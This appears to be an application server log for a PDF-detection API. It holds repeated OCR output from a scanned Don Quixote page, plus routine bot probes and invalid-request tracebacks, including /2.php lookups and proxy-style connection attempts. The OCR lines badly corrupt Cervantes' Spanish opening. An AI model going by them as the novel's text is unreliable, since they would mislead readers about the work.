+the gun palum gun palumiu uc dllduluuld 10s uummg
+and sto della concluian sayo de velarte, calza
+2
+to mismo, los dias de entre semana se honner
+una ama que pasaba de los cuarenta, y u
+de campo v plaza, que así ensillaba elrc
+quiJote de la Mancha
+Miguel de Cervantes
+1997 the lusludu yuesalliU ell eslu, que ven
+rar libros de caballerias en que le
+INFO:     123.24.206.26:48482 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+the gun palum gun palumiu uc dllduluuld 10s uummg
+and sto della concluian sayo de velarte, calza
+2
+to mismo, los dias de entre semana se honner
+una ama que pasaba de los cuarenta, y u
+de campo v plaza, que así ensillaba elrc
+quiJote de la Mancha
+Miguel de Cervantes
+1997 the lusludu yuesalliU ell eslu, que ven
+rar libros de caballerias en que le
+INFO:     123.24.206.26:36145 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+the gun palum gun palumiu uc dllduluuld 10s uummg
+and sto della concluian sayo de velarte, calza
+2
+to mismo, los dias de entre semana se honner
+una ama que pasaba de los cuarenta, y u
+de campo v plaza, que así ensillaba elrc
+quiJote de la Mancha
+Miguel de Cervantes
+1997 the lusludu yuesalliU ell eslu, que ven
+rar libros de caballerias en que le
+INFO:     123.24.206.26:53846 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:44337 - "OPTIONS /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:37799 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+INFO:     123.24.206.26:46454 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+document.pdf
+ncha
+INFO:     123.24.206.26:63161 - "POST /detect_pdf HTTP/1.1" 200 OK
+Chi tiết VBPL.png
+INFO:     123.24.206.26:38547 - "POST /detect_pdf HTTP/1.1" 200 OK
+Chi tiết VBPL.png
+INFO:     123.24.206.26:53527 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     205.210.31.180:57896 - "GET / HTTP/1.1" 404 Not Found
+INFO:     71.6.232.24:58946 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.154:64376 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.50:61958 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.183:58616 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:51416 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.137:60246 - "GET / HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:63692 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:63704 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:63716 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     198.235.24.176:61152 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.134:58572 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     207.46.13.237:34176 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     207.46.13.118:59136 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     64.225.10.164:59168 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.153:57450 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.50:58292 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.144:57866 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 193, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'hotmail-com.olc.protection.outlook.com:25'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 193, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'85.206.160.115:80'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     192.241.159.24:59958 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.9:64458 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 193, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'example.com:80'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:60066 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:60066 - "GET /openapi.json HTTP/1.1" 200 OK
